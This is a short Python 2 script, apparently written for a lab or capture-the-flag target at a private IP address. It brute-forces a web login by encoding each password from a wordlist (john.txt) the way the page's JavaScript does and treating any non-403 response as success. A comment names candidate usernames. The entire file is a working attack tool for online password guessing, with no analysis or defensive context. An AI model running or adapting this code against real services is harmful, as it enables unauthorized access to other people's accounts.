import requests
import random
import sys

IP_ADDR     = "172.16.89.128"
PORT        = "8080"
INPUT_FILE  = "john.txt"
USERNAME    =  None # root, hardtop


# implements scramble used in js
# returns a string
def scramble(password):
	return "-".join([str(ord(c)) for c in password])

# creates GET request URL
# example: http://172.16.89.128:8080/$04743414665572345?pw=116-101-115-116&un=116-101-115-116.inbox
def create_url(username, password):
	req_template = "http://{ip}:{port}/${rand}?pw={pass}&un={user}.inbox"
	req_template = req_template.replace("{ip}", IP_ADDR)
	req_template = req_template.replace("{port}", PORT)
	req_template = req_template.replace("{rand}", str(random.random()).replace("0.",""))
	req_template = req_template.replace("{pass}", scramble(password))
	req_template = req_template.replace("{user}", scramble(username))
	return req_template

# tries to login with a given username/password pair
# returns True if successful, else False
def attempt_login(username, password):
	url = create_url(username,password)
	r = requests.get(url)
	if r.status_code != 403:
		return True
	return False

def main():
	# args
	if len(sys.argv) != 2:
		sys.exit("Usage: python password_cracker.py [username]")

	# input file
	try:
		f = open(INPUT_FILE,"r")
	except:
		sys.exit("Unable to open %s" % (INPUT_FILE))

	# try to login
	username = sys.argv[1]
	for password in f:
		password = password.replace("\n","")
		if attempt_login(username, password):
			print "Password for username %s is %s" % (username, password)
			sys.exit()
	print "None of the passwords in the file %s worked for user %s" % (INPUT_FILE, username)

	f.close()

if __name__ == '__main__':
	main()